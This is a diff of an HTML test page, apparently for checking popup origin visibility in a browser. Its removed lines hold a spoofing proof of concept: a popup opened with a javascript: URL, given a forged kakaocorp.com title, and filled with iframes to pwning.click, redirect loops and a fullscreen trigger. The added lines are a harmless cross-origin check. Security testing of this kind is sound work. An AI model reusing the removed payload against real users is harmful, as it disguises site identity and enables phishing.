@@ -1,23 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Arc Origin Visibility Test</title>
+<style>
+body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+button { padding: 15px 30px; font-size: 18px; }
+</style>
+</head>
+<body>
 
-
-<img id="button" src="https://t1.kakaocdn.net/kakaocorp/corp_thumbnail/Kakao.png">
-
+<h2>Popup Origin Visibility Test</h2>
+<button onclick="openTest()">Open Secure Popup</button>
 
 <script>
-var s="https://kakaocorp.com";
-var button=document.getElementById("button");
-button.href=s;
-var qwin;
-button.onclick=function(e){
+function openTest() {
+    const testWindow = window.open(
+        "https://example.com",
+        "_blank"
+    );
 
-	qwin=open('javascript:alert(1)',"toolbar=no,height=350,width=305");
-	setTimeout(function(){
-		qwin.document.title=s;
-		qwin.document.body.innerHTML=`<iframe src=https://pwning.click/permission.php><meta http-equiv="refresh" content="111;url=https://www.google.com:8000"><button onclick = "document.documentElement.requestFullscreen()">start full screen</button> <embed src=https://permission.site><iframe src="javascript:setInterval(function(){parent.location='javascript:parent.location='https://google.com:8000';alert(1)}, 10)"/></iframe>
-		 <iframe src="javascript:setInterval(function(){alert(top.document.location)}, 1000000)"/></iframe><embed src=https://permission.site>
-		
-		`;
-		
-	},333)
-return false;}
+    setTimeout(() => {
+        try {
+            testWindow.document.title = "Testing Origin Visibility";
+        } catch (e) {
+            console.log("Cross-origin access blocked (expected)");
+        }
+    }, 1000);
+}
 </script>
+
+</body>
+</html>
